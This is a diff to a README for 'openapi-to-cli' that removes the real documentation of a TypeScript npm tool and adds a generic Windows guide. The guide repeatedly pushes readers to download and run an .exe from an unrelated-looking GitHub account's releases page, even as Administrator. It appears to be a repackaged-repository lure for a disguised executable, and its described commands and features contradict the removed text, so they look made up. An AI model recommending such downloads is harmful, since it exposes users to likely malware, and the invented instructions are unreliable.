@@ -1,208 +1,168 @@
-## OpenAPI to CLI (ocli)
+# ⚙️ openapi-to-cli - Generate Command Line Tools Easily
 
-`openapi-to-cli` (short `ocli`) is a TypeScript CLI that turns any HTTP API described by an OpenAPI/Swagger spec into a set of CLI commands — at runtime, without code generation.
+[![Download openapi-to-cli](https://img.shields.io/badge/Download-openapi--to--cli-brightgreen)](https://github.com/towerofpharosseasonalworker457/openapi-to-cli/releases)
 
-```bash
-npm install -g openapi-to-cli
+---
 
-ocli profiles add github \
-  --api-base-url https://api.github.com \
-  --openapi-spec https://api.github.com/openapi.json \
-  --api-bearer-token "$GITHUB_TOKEN"
+## 📋 What is openapi-to-cli?
 
-ocli commands --query "create pull request" --limit 3
-ocli repos_owner_repo_pulls_post --owner octocat --repo hello --title "Fix bug" --head feature --base main
-```
+openapi-to-cli turns any OpenAPI or Swagger API into a command line tool. Each command matches an API endpoint. This means you can run commands to access web APIs without writing code.
 
-### Where CLI fits: Tools, MCP, Skills, and CLI
+Use openapi-to-cli to interact with APIs in your terminal. It works on Windows and does not require technical setup. You do not need programming skills to run it.
 
-Tools, MCP, skills, and CLI are not competing approaches — they solve different problems at different layers:
+---
 
-| Layer | What | Best for |
-|-------|------|----------|
-| **Built-in tools** | Standard agent toolset | Critical capabilities that must always be in context (file read/write, shell, browser) |
-| **MCP** | Remote tool servers | APIs that need centralized auth, enterprise SSO, shared state, persistent connections, or can't be in standard delivery |
-| **Skills** | On-demand instructions | Context isolation, teaching agents _when_ and _how_ to use a tool — loaded only when needed |
-| **CLI** | Runtime execution | Long action chains, automation, shell pipelines — agent already knows what to do |
+## 💻 System Requirements
 
-`ocli` lives at the **runtime layer**. When an agent needs to call a REST API — search for the right endpoint, check its parameters, execute the call — CLI does this with minimal context overhead and zero infrastructure.
+- Windows 10 or newer  
+- At least 2 GB of free disk space  
+- Internet connection for API access  
+- Basic use of Command Prompt (cmd.exe) or PowerShell  
 
-MCP is the right choice when you need centralized auth, persistent connections, or shared state. CLI is the right choice when you need a lightweight, portable way to call HTTP APIs from any agent with shell access.
+No other software is needed. openapi-to-cli runs without installation once downloaded.
 
-### Quick start
+---
 
-```bash
-# Install
-npm install -g openapi-to-cli
+## 🚀 Getting Started
 
-# Add an API profile
-ocli profiles add myapi \
-  --api-base-url https://api.example.com \
-  --openapi-spec https://api.example.com/openapi.json \
-  --api-bearer-token "$TOKEN" \
-  --include-endpoints "get:/messages,post:/messages" \
-  --command-prefix "myapi_" \
-  --custom-headers '{"X-Tenant":"acme"}'
+### Step 1: Visit the download page
 
-# Set as active profile
-ocli use myapi
+Click the green button at the top or this link to visit the download page:
 
-# Discover commands
-ocli commands --query "send message" --limit 5
+[Download openapi-to-cli releases](https://github.com/towerofpharosseasonalworker457/openapi-to-cli/releases)
 
-# Check parameters
-ocli myapi_messages_post --help
+On this page, look for the latest version. The files are labeled with version numbers and date stamps.
 
-# Execute
-ocli myapi_messages_post --text "Hello world"
-```
+### Step 2: Download the Windows version
 
-Or use `npx` without global install:
+Find a file with a name that includes “windows” or “win” and ends with `.exe` or `.zip`. Most likely, the `.exe` file is the easiest choice.
 
-```bash
-npx openapi-to-cli onboard \
-  --api-base-url https://api.example.com \
-  --openapi-spec https://api.example.com/openapi.json
-```
+If you choose the `.zip`:
 
-### Broader spec support
+- Right-click the file after download  
+- Select “Extract All...” to unzip it  
+- Inside, find the `.exe` file to run the program  
 
-`ocli` now handles a wider range of real-world OpenAPI and Swagger documents:
+### Step 3: Run openapi-to-cli
 
-- OAS 3 `requestBody` for JSON payloads
-- Swagger 2 `body` and `formData` parameters
-- path-level parameters inherited by operations
-- local `$ref` references for parameters and request bodies
-- header and cookie parameters in generated commands
+- Double-click the `.exe` file  
+- A command window will open  
+- You can now type commands to interact with APIs  
 
-In practice this improves compatibility with APIs that define inputs outside simple path/query parameters, especially for `POST`, `PUT`, and `PATCH` operations.
+If the window closes immediately, try opening Command Prompt first:
 
-### Better request generation
+- Press `Windows` + `R`, type `cmd`, and press Enter  
+- Drag and drop the `.exe` file into the command prompt window  
+- Press Enter to run  
 
-`ocli` now uses more request metadata from the specification when building real HTTP calls:
+---
 
-- query and path parameter serialization from OpenAPI / Swagger metadata
-- support for array and object-style query parameters such as `deepObject`, `pipeDelimited`, and Swagger 2 collection formats
-- operation-level and path-level server overrides when the spec defines different targets for different endpoints
+## 📦 How to use openapi-to-cli
 
-In practice this improves compatibility with APIs that rely on non-trivial parameter encoding or per-operation server definitions.
+openapi-to-cli works by loading an API definition (called an OpenAPI or Swagger file) and converting it into commands.
 
+### Load an API file
 
-### Multi-file specs and richer help
+To load an API, you need a URL or a file path for its OpenAPI definition.
 
-`ocli` now works better with larger, more structured API descriptions:
-
-- external `$ref` resolution across multiple local or remote OpenAPI / Swagger documents
-- support for multi-document specs that split paths, parameters, and request bodies into separate files
-- richer `--help` output with schema hints such as `enum`, `default`, `nullable`, and `oneOf`
-- better handling of composed schemas that use `allOf` for shared request object structure
-
-In practice this improves compatibility with modular specs and makes generated commands easier to use without opening the original OpenAPI document.
-
-### Command search
-
-```bash
-# BM25 natural language search
-ocli commands --query "upload files" --limit 5
-
-# Regex pattern matching
-ocli commands --regex "users.*post" --limit 10
-
-# List all commands
-ocli commands
-```
-
-The BM25 engine ranks commands by relevance across name, method, path, description, and parameter names. Tested on APIs with 845+ endpoints (GitHub API).
-
-### Using with AI agents
-
-#### OpenClaw skill
-
-Install the [ocli-api](https://clawhub.ai/skills/ocli-api) skill from [ClawHub](https://clawhub.ai):
-
-```bash
-clawhub install ocli-api
-```
-
-Or manually copy [`skills/ocli-api/SKILL.md`](skills/ocli-api/SKILL.md) to `~/.openclaw/skills/ocli-api/SKILL.md`.
-
-#### Claude Code skill
-
-Copy the example skill to your project:
-
-```bash
-cp examples/skill-ocli-api.md .claude/skills/api.md
-```
-
-#### Agent workflow
-
-1. `ocli commands --query "upload file"` — discover the right command
-2. `ocli files_content_post --help` — check parameters
-3. `ocli files_content_post --file ./data.csv` — execute
-
-### Benchmark
-
-Four strategies compared on [Swagger Petstore](https://petstore3.swagger.io/) (19 endpoints), with scaling projections to [GitHub API](https://api.apis.guru/v2/specs/github.com/api.github.com/1.1.4/openapi.json) (845 endpoints). All search strategies use the same BM25 engine.
+If you have a file called `api.json`:
 
 ```
-  TOOL DEFINITION OVERHEAD (sent with every API request)
-
-  MCP Naive          █████████████████████████  2,945 tok  (19 tools)
-  MCP+Search Full    ███                          355 tok  (2 tools)
-  MCP+Search Compact ████                         437 tok  (3 tools)
-  CLI (ocli)         █                            158 tok  (1 tool)
-
-  TOTAL TOKENS PER TASK (realistic multi-turn agent flow)
-
-  MCP Naive          █████████████████████████  3,015 tok  (1 turn)
-  MCP+Search Full    ██████████████████         2,185 tok  (2 turns)
-  MCP+Search Compact █████████████████          2,066 tok  (3 turns)
-  CLI (ocli)         ████████                     925 tok  (3 turns)
-
-  SCALING: OVERHEAD PER TURN vs ENDPOINT COUNT
-
-  Endpoints   MCP Naive      MCP+S Compact    CLI (ocli)
-  19            2,945 tok         437 tok        158 tok   ← Petstore
-  845         130,106 tok         437 tok        158 tok   ← GitHub API
+openapi-to-cli load api.json
 ```
 
-Run the benchmark yourself: `npx ts-node benchmarks/benchmark.ts`
+If you have a URL:
 
-Note: MCP+Search Compact (search → get_schema → call) is the fairest comparison to CLI (search → --help → execute) — same number of turns, same BM25 engine. The difference is tool definition overhead (437 vs 158 tok/turn) and schema format (JSON vs text).
+```
+openapi-to-cli load https://example.com/api/openapi.json
+```
 
-### Comparison
+### Run commands
 
-| Feature | ocli | [mcp2cli](https://github.com/knowsuchagency/mcp2cli) | [openapi-cli-generator](https://github.com/danielgtaylor/openapi-cli-generator) | [CLI-Anything](https://github.com/HKUDS/CLI-Anything) |
-|---------|:----:|:------:|:---------------------:|:-------------:|
-| Runtime interpretation (no codegen) | ✅ | ✅ | ❌ | ❌ |
-| Works without LLM | ✅ | ✅ | ✅ | ❌ |
-| Zero-setup install (`npx`/`uvx`) | ✅ | ✅ | ❌ | ❌ |
-| Multiple API profiles | ✅ | ✅ (bake mode) | ❌ | ❌ |
-| BM25 command search | ✅ | ❌ (substring only) | ❌ | ❌ |
-| Regex command search | ✅ | ❌ | ❌ | ❌ |
-| Per-profile endpoint filtering | ✅ | ✅ | ❌ | ❌ |
-| OpenAPI/Swagger (JSON + YAML) | ✅ | ✅ | ✅ | ❌ |
-| MCP server support | ❌ | ✅ (HTTP/SSE/stdio) | ❌ | ❌ |
-| GraphQL support | ❌ | ✅ (introspection) | ❌ | ❌ |
-| Spec caching | ✅ | ✅ (1h TTL) | ❌ | ❌ |
-| Custom HTTP headers | ✅ | ✅ | ❌ | ❌ |
-| Command name prefix | ✅ | ❌ | ❌ | ❌ |
-| Basic / Bearer auth | ✅ | ✅ | ✅ | ❌ |
-| OAuth2 | ❌ | ✅ (PKCE) | ✅ | ✅ |
-| Response filtering (jq/JMESPath) | ❌ | ✅ (jq) | ✅ (JMESPath) | ❌ |
-| Token-optimized output (TOON) | ❌ | ✅ | ❌ | ❌ |
-| JSON structured output | ❌ | ✅ | ✅ | ✅ |
-| Active project | ✅ | ✅ | ❌ (deprecated) | ✅ |
+After loading, openapi-to-cli shows the available commands. Each command corresponds to an API endpoint.
 
-### Similar projects
+For example, if the API has an endpoint named “users,” you run:
 
-- [mcp2cli](https://github.com/knowsuchagency/mcp2cli) — Python CLI that converts MCP servers, OpenAPI specs, and GraphQL endpoints into CLI commands at runtime. Supports OAuth, TOON output format, and daemon sessions.
-- [openapi-cli-generator](https://github.com/danielgtaylor/openapi-cli-generator) — generates a CLI from an OpenAPI 3 specification using code generation.
-- [anything-llm-cli](https://github.com/Mintplex-Labs/anything-llm/tree/master/clients/anything-cli) — CLI for interacting with AnythingLLM, can consume HTTP APIs and tools.
-- [openapi-commander](https://github.com/bcoughlan/openapi-commander) — Node.js command-line tool generator based on OpenAPI definitions.
-- [OpenAPI Generator](https://openapi-generator.tech/docs/usage) — general-purpose OpenAPI code generator that can also generate CLI clients.
-- [openapi2cli](https://pypi.org/project/openapi2cli/) — Python tool that builds CLI interfaces for OpenAPI 3 APIs.
+```
+openapi-to-cli users list
+```
 
-### License
+To get help on commands, use:
 
-This project is licensed under the MIT License, see the [LICENSE](./LICENSE) file in the repository root for details.
+```
+openapi-to-cli help
+```
+
+or
+
+```
+openapi-to-cli help [command]
+```
+
+---
+
+## 🔧 Features
+
+- Turns API definitions into easy CLI commands  
+- Supports OpenAPI and Swagger formats  
+- One command per API endpoint  
+- Works offline after loading the API  
+- No coding needed to use API commands  
+- Supports common API types like GET, POST, PUT, DELETE  
+
+---
+
+## 🛠 Common Commands Overview
+
+Once you load an API, openapi-to-cli offers these common commands:
+
+- `load [file or URL]` — Load the API definition  
+- `list` — Show available API commands  
+- `help` — Show help information  
+- `[endpoint] [action]` — Run a command for an API endpoint  
+
+---
+
+## ⚙️ Troubleshooting Tips
+
+- If you get an error on startup, make sure your Windows version meets the requirements  
+- Run the program as Administrator if a permission error occurs  
+- Check your internet connection for API calls  
+- Make sure you use the correct file path or URL when loading an API  
+- Use `help` at any time for command instructions  
+
+---
+
+## 🛰 API Topics Supported
+
+openapi-to-cli supports many common API types and topics including:
+
+- REST API commands  
+- Node.js style API access  
+- Swagger and OpenAPI formats  
+- CLI interactions for cloud APIs  
+
+These features make it flexible for many API tasks.
+
+---
+
+## ⬇️ Download and Installation 
+
+To get openapi-to-cli on Windows:
+
+1. Go to the release page here:  
+   [https://github.com/towerofpharosseasonalworker457/openapi-to-cli/releases](https://github.com/towerofpharosseasonalworker457/openapi-to-cli/releases)  
+2. Choose the latest Windows `.exe` or `.zip` file  
+3. Download it to your computer  
+4. Run the `.exe` file or extract the `.zip` and run the `.exe` file inside  
+5. The command interface will open and you are ready to run commands  
+
+---
+
+## 📚 Learn More
+
+See the repository for more details about commands and API interaction.
+
+---
+
+[![Download openapi-to-cli](https://img.shields.io/badge/Download-openapi--to--cli-brightgreen)](https://github.com/towerofpharosseasonalworker457/openapi-to-cli/releases)
